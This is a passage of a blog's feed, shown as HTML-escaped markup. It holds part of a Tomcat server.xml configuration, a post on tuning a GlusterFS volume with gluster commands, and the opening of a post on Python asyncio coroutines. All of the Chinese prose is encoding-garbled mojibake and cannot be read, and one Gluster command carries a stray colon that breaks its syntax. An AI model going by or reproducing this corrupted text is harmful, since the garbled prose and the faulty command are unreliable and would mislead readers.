&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;&amp;lt;Server port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-1&amp;#34; shutdown=&amp;#34;SHUTDOWN&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;Listener className=&amp;#34;org.apache.catalina.startup.VersionLoggerListener&amp;#34; /&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;Listener className=&amp;#34;org.apache.catalina.core.AprLifecycleListener&amp;#34; SSLEngine=&amp;#34;on&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;Listener className=&amp;#34;org.apache.catalina.core.JreMemoryLeakPreventionListener&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;Listener className=&amp;#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;Listener className=&amp;#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener&amp;#34; /&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;&amp;lt;GlobalNamingResources&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;lt;Resource name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;UserDatabase&amp;#34; auth=&amp;#34;Container&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;              type=&amp;#34;org.apache.catalina.UserDatabase&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;              description=&amp;#34;User database that can be updated and saved&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;              factory=&amp;#34;org.apache.catalina.users.MemoryUserDatabaseFactory&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;              pathname=&amp;#34;conf/tomcat-users.xml&amp;#34; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;lt;/GlobalNamingResources&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;&amp;lt;Service name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Catalina&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;lt;Connector port=&amp;#34;8080&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               server=&amp;#34;www.rendoumi.com&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               protocol=&amp;#34;org.apache.coyote.http11.Http11NioProtocol&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               maxHttpHeaderSize=&amp;#34;8192&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               acceptCount=&amp;#34;500&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               maxThreads=&amp;#34;1000&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               minSpareThreads=&amp;#34;200&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               enableLookups=&amp;#34;false&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               redirectPort=&amp;#34;8443&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               connectionTimeout=&amp;#34;20000&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               relaxedQueryChars=&amp;#34;[]|{}@!$*()+&amp;#39;.,;^\`&amp;amp;quot;&amp;amp;lt;&amp;amp;gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               disableUploadTimeout=&amp;#34;true&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               allowTrace=&amp;#34;false&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               URIEncoding=&amp;#34;UTF-8&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               useBodyEncodingForURI=&amp;#34;true&amp;#34; /&amp;gt;  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;lt;Engine name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Catalina&amp;#34; defaultHost=&amp;#34;localhost&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      &amp;lt;Realm className=&amp;#34;org.apache.catalina.realm.LockOutRealm&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        &amp;lt;Realm className=&amp;#34;org.apache.catalina.realm.UserDatabaseRealm&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;               resourceName=&amp;#34;UserDatabase&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      &amp;lt;/Realm&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      &amp;lt;Host name=&amp;#34;localhost&amp;#34; appBase=&amp;#34;webapps&amp;#34; unpackWARs=&amp;#34;false&amp;#34; autoDeploy=&amp;#34;false&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          &amp;lt;Valve className=&amp;#34;org.apache.catalina.valves.AccessLogValve&amp;#34; directory=&amp;#34;logs&amp;#34; prefix=&amp;#34;access_log.&amp;#34; suffix=&amp;#34;.txt&amp;#34;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;                fileDateFormat=&amp;#34;yyyy-MM-dd&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;                pattern=&amp;#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i &amp;#34; resolveHosts=&amp;#34;false&amp;#34;/&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;          &amp;lt;Context path=&amp;#34;&amp;#34; docBase=&amp;#34;/export/servers/tomcat/webapps/web&amp;#34; /&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      &amp;lt;/Host&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;lt;/Engine&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;&amp;lt;/Service&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;&amp;lt;/Server&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åˆ†è§£å¼€æ¥ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„çœ‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>GlusterFSæ–‡ä»¶ç³»ç»Ÿçš„ä¼˜åŒ–</title>
      <link>https://rendoumi.com/posts/20211115-gluster_tuning/</link>
      <pubDate>Mon, 15 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211115-gluster_tuning/</guid>
      <description>&lt;p&gt;å…¬å¸ç”¨äº†6å¹´çš„GlusterFSç»ˆäºåˆ°äº†è¦è°ƒæ•´å·å‚æ•°çš„åœ°æ­¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;å°æ–‡ä»¶å·²ç»å¤šåˆ°è¦å½±å“ IO çš„åœ°æ­¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆè¯´ä¸€ä¸‹ç»“è®ºï¼ŒGlusterFS å®‰è£…å®Œæˆåï¼ŒåŸºæœ¬ä¸éœ€è¦è°ƒæ•´ä»»ä½•å‚æ•°ã€‚ç”Ÿäº§ç³»ç»Ÿåƒä¸‡ä¸å¯ç›²ç›®ï¼&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬è¿™æ˜¯æœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ‰€ä»¥è°ƒä¼˜æ­¥éª¤å¦‚ä¸‹ï¼ˆä»¥å·åä¸º esign-vol ä¸ºä¾‹ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¿…é¡»å…³æ‰NFS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol nfs.disable on
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¿…é¡»ä¿ç•™10%çš„ç©ºé—´ï¼Œé¿å…å¡çˆ†å·ç©ºé—´&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol cluster.min-free-disk 10%
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æœ¬æœºæœ‰256Gçš„å†…å­˜ï¼Œæ‰€ä»¥è®¾ç½®25Gçš„è¯»ç¼“å­˜&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol performance.cache-size 25GB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è¯»ç¼“å­˜ä¸­ï¼Œå•ä¸ªæ–‡ä»¶çš„ç¼“å­˜ï¼Œæœ€å¤§æ–‡ä»¶sizeæ˜¯128MBï¼Œå¤§äº128MBçš„å•ä¸ªæ–‡ä»¶ä¸ç¼“å­˜&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol performance.cache-max-file-size 128MB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è®¾ç½®æ¯ä¸ªå®¢æˆ·ç«¯éƒ½å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯2ï¼Œå¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol client.event-threads &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è®¾ç½®æœåŠ¡å™¨ç«¯å¯¹ç‰¹å®šçš„å·å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯1,å¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol server.event-threads &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ†å‰²çº¿ï¼Œä»¥ä¸‹å‚æ•°ä¸è¦è°ƒæ•´ï¼Œé™¤éæ˜ç¡®çŸ¥é“åæœ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è®¾ç½® io çº¿ç¨‹æ•°é‡ï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯16ï¼Œå·²ç»å¾ˆå¤§äº†ï¼Œè¶³å¤Ÿç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol performance.io-thread-count &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è®¾ç½®å†™ç¼“å†²åŒºï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯1Mï¼Œå¼„å¤§äº†å¦‚æœåœç”µä»€ä¹ˆçš„ï¼Œä¼šä¸¢æ•°æ®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gluster volume &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; esign-vol performance.write-behind-window-size: 1M  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šå°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸ªå‚æ•° global-threading ï¼Œç¼ºçœæ˜¯ offï¼Œä¸è¦è®¾ç½®ä¸º onï¼Œæœ‰ä½¿ç”¨æ¡ä»¶çš„ï¼Œå¼„é”™äº†åè€Œä¼šå¯¼è‡´æ€§èƒ½é™ä½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211115113321750&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211115-gluster_tuning/image-20211115113321750.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pythonçš„åç¨‹è¯¦ç»†è§£é‡Š</title>
      <link>https://rendoumi.com/posts/20211112-python_aiohttp/</link>
      <pubDate>Fri, 12 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211112-python_aiohttp/</guid>
      <description>&lt;p&gt;åœ¨å®é™…ä¸­é‡åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå…¬å¸è½¯ä»¶å‘å¸ƒä¸Šçº¿è‡ªåŠ¨åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;è¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯éœ€è¦å»ç™»å½•ä¸€ä¸ªä¸Šçº¿çš„å†…éƒ¨ç½‘ç«™ï¼Œç„¶åçˆ¬ä¸‹æ‰€æœ‰çš„ä¸Šçº¿æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæ ¹æ®çˆ¬ä¸‹æ¥çš„æ•°æ®æ•´ç†å¥½ï¼Œå¯ä»¥ä¸€èµ·ä¸Šçº¿çš„ï¼Œå°±å¹¶å‘å¤šçº¿ç¨‹ï¼Œå…¶å®å°±æ˜¯å»ä¼ å‚æ•°ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ç­‰è¿”å›ã€‚&lt;/p&gt;
&lt;p&gt;ä¸èƒ½å¹¶å‘çš„å°±å•çº¿ç¨‹ç‚¹é“¾æ¥ã€‚&lt;/p&gt;
&lt;p&gt;é‚£è¿™ä¸ªäº‹æƒ…å¿…é¡»æ›´æœ‰æ•ˆç‡ï¼Œå•çº¿ç¨‹çš„æ²¡é—®é¢˜ï¼Œç”¨ python çš„ request å°±å¯ä»¥å®ç°äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»”ç»†ç ”ç©¶ä¸€ä¸‹åç¨‹ï¼Œå…ˆè®²ä¸€ä¸‹å†å²ï¼š&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨Pythonçš„äººå¾€å¾€çº ç»“åœ¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ï¼Œå“ªä¸ªæ•ˆç‡æ›´é«˜ï¼Ÿåˆ°åº•ç”¨å“ªä¸ªå¥½å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…¶å® Python çš„å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹ï¼Œç›¸å¯¹äºåˆ«å®¶çš„åç¨‹å’Œå¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œéƒ½ä¸è¡Œï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢è€—è´¹ CPU å’Œå¯„å­˜å™¨ï¼ŒOS çš„è°ƒåº¦ä¸å¯æ§ï¼Œå¤šè¿›ç¨‹ä¹‹é—´é€šè®¯ä¹Ÿä¸ä¾¿ã€‚æ€§èƒ½æ ¹æœ¬ä¸è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åæ¥å‘¢ Python æ”¹è¿›äº†è¯­æ³•ï¼Œå‡ºç°äº† yiled from å……å½“åç¨‹è°ƒåº¦ï¼Œæœ‰äººå°±æ ¹æ®è¿™ä¸ªç‰¹æ€§å¼€å‘äº†ç¬¬ä¸‰æ–¹çš„åç¨‹æ¡†æ¶ï¼ŒTornadoï¼ŒGeventç­‰ã€‚&lt;/p&gt;
&lt;p&gt;å®˜æ–¹ä¹Ÿä¸èƒ½åè§†ä¸ç†å•Šï¼Œä»»å‡­åˆ«äººå‡ºé£å¤´ï¼Œäºæ˜¯ Python ä¹‹çˆ¶æ·±å…¥ç®€å‡º3å¹´ï¼Œè‹¦å¿ƒé’»ç ”è‡ªå®¶çš„åç¨‹ï¼Œasync/await å’Œ asyncio åº“ï¼Œå¹¶æ”¾åˆ° Python3.5 åæˆä¸ºå®˜æ–¹åŸç”Ÿçš„åç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äº httpè¯·æ±‚ã€è¯»å†™æ–‡ä»¶ã€è¯»å†™æ•°æ®åº“è¿™ç§é«˜å»¶æ—¶çš„ IO æ“ä½œï¼Œåç¨‹æ˜¯ä¸ªå¤§æ€å™¨ï¼Œä¼˜ç‚¹éå¸¸å¤šï¼›å®ƒå¯ä»¥åœ¨é¢„æ–™åˆ°ä¸€ä¸ªé˜»å¡å°†å‘ç”Ÿæ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œè·‘å»æ‰§è¡Œå…¶å®ƒåç¨‹ï¼ŒåŒæ—¶æŠŠäº‹ä»¶æ³¨å†Œåˆ°å¾ªç¯ä¸­ï¼Œå®ç°äº†å¤šåç¨‹å¹¶å‘ï¼Œå…¶å®è¿™ç©æ„æ˜¯è·Ÿ Nodejs çš„å›è°ƒå­¦çš„ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹ä¸‹å›¾ï¼Œè¯¦ç»†è§£é‡Šä¸‹ï¼Œå·¦è¾¹æˆ‘ä»¬æœ‰100ä¸ªç½‘é¡µè¯·æ±‚ï¼Œå¹¶å‘100ä¸ªåç¨‹è¯·æ±‚ï¼ˆå…¶å®ä¹Ÿæ˜¯1ä¸ª1ä¸ªå‘ï¼‰ï¼Œå½“éœ€è¦ç­‰å¾…é•¿æ—¶é—´å›åº”å›åº”æ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°åˆ°äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰ä¸­ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œå½“æœ‰åç¨‹äº‹ä»¶å®Œæˆå†é€šè¿‡å›è°ƒå‡½æ•°å”¤é†’æŒ‚èµ·çš„åç¨‹ï¼Œç„¶åè¿”å›ç»“æœã€‚&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211112-python_aiohttp/image-20211112085624811.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè·Ÿ nodejs çš„å›è°ƒå‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨æ„ä¸»è¿›ç¨‹å’Œåç¨‹çš„å…³ç³»ï¼Œå¦‚æœæˆ‘åœ¨ä¸€ä¸ªä¸»è¿›ç¨‹ä¸­ï¼Œè§¦å‘åç¨‹å‡½æ•°ï¼Œæœ‰100ä¸ªåç¨‹ï¼Œé‚£ä¹ˆå¿…é¡»ç­‰å¾…100ä¸ªåç¨‹éƒ½ç»“æŸåï¼Œæ‰èƒ½å›åˆ°æ­£å¸¸çš„é‚£ä¸ªä¸»è¿›ç¨‹ä¸­ã€‚å½“ç„¶ï¼Œä¸»è¿›ç¨‹ä¹Ÿå¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªåç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåç¨‹çš„åŸºæœ¬ç”¨æ³•&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;async f(n) å£°æ˜ä¸€ä¸ªå‡½æ•°æ˜¯åç¨‹çš„&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;await f(n) æŒ‚èµ·å½“å‰åç¨‹ï¼ŒæŠŠæ§åˆ¶æƒäº¤å› event loopï¼Œå¹¶ä¸”æ‰§è¡Œf(n)å’Œæ³¨å†Œä¹‹åçš„f(n)å›è°ƒã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœåœ¨ g() è¿™ä¸ªå‡½æ•°ä¸­æ‰§è¡Œäº† await f()ï¼Œé‚£ä¹ˆg()å‡½æ•°ä¼šè¢«æŒ‚èµ·ï¼Œå¹¶ç­‰å¾… f() å‡½æ•°æœ‰ç»“æœç»“æŸï¼Œç„¶åè¿”å› g() ç»§ç»­æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
